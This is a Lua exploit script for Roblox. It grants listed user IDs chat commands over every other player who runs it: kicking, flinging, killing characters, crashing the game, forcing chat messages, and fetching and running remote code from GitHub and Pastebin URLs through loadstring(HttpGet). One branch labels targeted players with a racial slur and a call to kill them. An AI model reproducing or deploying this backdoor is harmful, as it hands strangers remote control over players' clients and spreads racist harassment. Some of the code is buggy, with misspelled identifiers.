local StarId = {
	[2279582870] = true, --zoe <3

}

local StaffId = {}

local AdminId = {
	[1359226417] = true, --Hakuchan8
	[2692729677] = true, --Hellencucilina
}

local EnemyId = {}

function premium()
	for _,v in pairs(game:GetService('Players'):GetChildren()) do
		if StaffId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
				end
			local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("\n Kicked by Staff.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
			if game.Players.LocalPlayer ~= v then
			BeingBenxed = true
			while BeingBenxed == true do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
			for i,v in pairs(game:GetService('Players'):GetChildren()) do
            AnimationId = "3152394906"
            local Anim = Instance.new("Animation")
            Anim.AnimationId = "rbxassetid://"..AnimationId
            local BenxAnimation = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
            BenxAnimation:Play()
                end
			end
		end
	end
end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
			if game.Players.LocalPlayer ~= v then
			BeingBenxed = false
            loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/StopAnimations.lua'))()
			local key=game:GetService("VirtualInputManager")
            key:SendKeyEvent(true,"LeftControl",false,game)
            wait()
            key:SendKeyEvent(false,"LeftControl",false,game)
            end
	    end
	end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ban .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:kick("PERMA BAN")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$kill .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$rejoin .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$bring .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$grave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ungrave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("/e test") then
				if game.Players.LocalPlayer ~= v then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$crash .") then
				if game.Players.LocalPlayer ~= v then
				game:Shutdown()
				end
	    end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$jumpscare .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
				end
			end
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$flash .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/flashbang.lua"))()
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$refresh .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		end)

		v.Chatted:connect(function(cht)
		if cht:match("$pray .") then
			if game.Players.LocalPlayer ~= v then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
			end
		end
		end)
		
		v.Chatted:connect(function(cht)
		if cht:match("$say") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
			end
		end
	end)

	v.Chatted:connect(function(cht)
		if cht:match("$emoji") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			emoji = SplitString[2]
			autoemoji = true
			while autoemoji == true do
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('['..emoji..']'..v.DisplayName)
			wait(0.1)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$unemoji") then
			if game.Players.LocalPlayer ~= v then
			autoemoji = false
			if StarId[v.UserId] then
		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
			elseif StaffId[v.UserId] then
            v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
			elseif AdminId[v.UserId] then
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$headless") then
			if game.Players.LocalPlayer ~= v then
			    v.Character.Head.Transparency = 1
                for i,v in pairs(v.Character.Head:GetChildren()) do
                if (v:IsA("Decal")) then
                    v:Destroy()
                    end
                end
			end
	    end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$korblox") then
			if game.Players.LocalPlayer ~= v then
	            local chr = v.Character
                chr.RightLowerLeg.MeshId = "902942093"
	            chr.RightLowerLeg.Transparency = "1"
	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
	            chr.RightFoot.MeshId = "902942089"
	            chr.RightFoot.Transparency = "1"
			end
	    end
	end)

end
		elseif StarId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
				end
local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("\n Kicked by Premium.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
			v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
			if game.Players.LocalPlayer ~= v then
			BeingBenxed = true
			while BeingBenxed == true do
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
				wait(0.1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
				for i,v in pairs(game:GetService('Players'):GetChildren()) do
                AnimationId = "3152394906"
                local Anim = Instance.new("Animation")
                Anim.AnimationId = "rbxassetid://"..AnimationId
                local BenxAnimation = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
                BenxAnimation:Play()
                end
			end
		end
	end
end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
			if game.Players.LocalPlayer ~= v then
			BeingBenxed = false
            loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/StopAnimations.lua'))()
			local key=game:GetService("VirtualInputManager")
            key:SendKeyEvent(true,"LeftControl",false,game)
            wait()
            key:SendKeyEvent(false,"LeftControl",false,game)
            end
	    end
	end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ban .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:kick("PERMA BAN")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$kill .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$rejoin .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$bring .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$grave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ungrave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("/e test") then
				if game.Players.LocalPlayer ~= v then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$crash .") then
				if game.Players.LocalPlayer ~= v then
				game:Shutdown()
				end
	    end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$jumpscare .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
				end
			end
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$flash .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/flashbang.lua"))()
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$refresh .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		end)
		v.Chatted:connect(function(cht)
		if cht:match("$pray .") then
			if game.Players.LocalPlayer ~= v then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
			end
		end
		end)

		v.Chatted:connect(function(cht)
		if cht:match("$say") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
			end
		end
	end)

	v.Chatted:connect(function(cht)
		if cht:match("$emoji") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			emoji = SplitString[2]
			autoemoji = true
			while autoemoji == true do
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('['..emoji..']'..v.DisplayName)
			wait(0.1)
			end
		end
	end
end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$unemoji") then
			if game.Players.LocalPlayer ~= v then
			autoemoji = false
			if StarId[v.UserId] then
		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
			elseif StaffId[v.UserId] then
            v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
			elseif AdminId[v.UserId] then
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$headless") then
			if game.Players.LocalPlayer ~= v then
			    v.Character.Head.Transparency = 1
                for i,v in pairs(v.Character.Head:GetChildren()) do
                if (v:IsA("Decal")) then
                    v:Destroy()
                    end
                end
			end
	    end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$korblox") then
			if game.Players.LocalPlayer ~= v then
	            local chr = v.Character
                chr.RightLowerLeg.MeshId = "902942093"
	            chr.RightLowerLeg.Transparency = "1"
	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
	            chr.RightFoot.MeshId = "902942089"
	            chr.RightFoot.Transparency = "1"
			end
	    end
	end)

end
		elseif AdminId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
				end
local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("\n Kicked by Admin.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
			v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
			if game.Players.LocalPlayer ~= v then
			BeingBenxed = true
			while BeingBenxed == true do
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
				wait(0.1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
				for i,v in pairs(game:GetService('Players'):GetChildren()) do
                AnimationId = "3152394906"
                local Anim = Instance.new("Animation")
                Anim.AnimationId = "rbxassetid://"..AnimationId
                local BenxAnimation = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
                BenxAnimation:Play()
                end
			end
		end
	end
end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
			if game.Players.LocalPlayer ~= v then
			BeingBenxed = false
            loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/StopAnimations.lua'))()
			local key=game:GetService("VirtualInputManager")
            key:SendKeyEvent(true,"LeftControl",false,game)
            wait()
            key:SendKeyEvent(false,"LeftControl",false,game)
            end
	    end
	end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
v.Chatted:connect(function(cht)
	if cht:match("$ban .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer:kick("PERMA BAN")
		end
	end
end)
		
v.Chatted:connect(function(cht)
	if cht:match("$kill .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end
end)
		
v.Chatted:connect(function(cht)
    if cht:match("$rejoin .") then
		if game.Players.LocalPlayer ~= v then
			loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
		end
	end
end)

v.Chatted:connect(function(cht)
	if cht:match("$bring .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
		end
	end
end)
	
v.Chatted:connect(function(cht)
	if cht:match("$grave .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
		end
	end
end)
v.Chatted:connect(function(cht)
if cht:match("$ungrave .") then
	if game.Players.LocalPlayer ~= v then
		game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
		wait(0.1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
		end
	end
end)
		
v.Chatted:connect(function(cht)
	if cht:match("/e test") then
		if game.Players.LocalPlayer ~= v then
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
		end
	end
end)
		
v.Chatted:connect(function(cht)
	if cht:match("$dropcash .") then
	if game.Players.LocalPlayer ~= v then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
		end
	end
end)
v.Chatted:connect(function(cht)
	if cht:match("$crash .") then
		if game.Players.LocalPlayer ~= v then
			game:Shutdown()
		end
    end
end)
v.Chatted:connect(function(cht)
	if cht:match("$jumpscare .") then
		if game.Players.LocalPlayer ~= v then
		    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
		end
	end
end)

		v.Chatted:connect(function(cht)
			if cht:match("$flash .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/flashbang.lua"))()
				end
			end
		end)

v.Chatted:connect(function(cht)
	if cht:match("$refresh .") then
			if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
			wait(8)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
		end
	end
end)

v.Chatted:connect(function(cht)
	if cht:match("$pray .") then
		if game.Players.LocalPlayer ~= v then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
		end
	end
end)
	v.Chatted:connect(function(cht)
	if cht:match("$say") then
		if game.Players.LocalPlayer ~= v then
		SplitString = cht:split(" ")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
		end
	end
end)
	v.Chatted:connect(function(cht)
		if cht:match("$emoji") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			emoji = SplitString[2]
			autoemoji = true
			while autoemoji == true do
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('['..emoji..']'..v.DisplayName)
			wait(0.1)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$unemoji") then
			if game.Players.LocalPlayer ~= v then
			autoemoji = false
			if StarId[v.UserId] then
		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
			elseif StaffId[v.UserId] then
            v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
			elseif AdminId[v.UserId] then
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
			end
		end
	end
	end)

v.Chatted:connect(function(cht)
	if cht:match("$headless") then
		if game.Players.LocalPlayer ~= v then
		    v.Character.Head.Transparency = 1
            for i,v in pairs(v.Character.Head:GetChildren()) do
            if (v:IsA("Decal")) then
                v:Destroy()
                end
            end
		end
    end
end)
	
v.Chatted:connect(function(cht)
	if cht:match("$korblox") then
		if game.Players.LocalPlayer ~= v then
            local chr = v.Character
            chr.RightLowerLeg.MeshId = "902942093"
            chr.RightLowerLeg.Transparency = "1"
            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
            chr.RightFoot.MeshId = "902942089"
            chr.RightFoot.Transparency = "1"
		end
    end
end)
elseif EnemyId[v.UserId] then
	if v.Character then
		if v.Character.Parent.Name == 'Players' then
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('🤡 KILL THIS NIGGER 🤡')
		end
	end
end
elseif not v.Character.UpperTorso:FindFirstChild('WaistRigAttachment') then
		v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😁]'..v.DisplayName)
        end
    end
end
local success,err = pcall(premium)
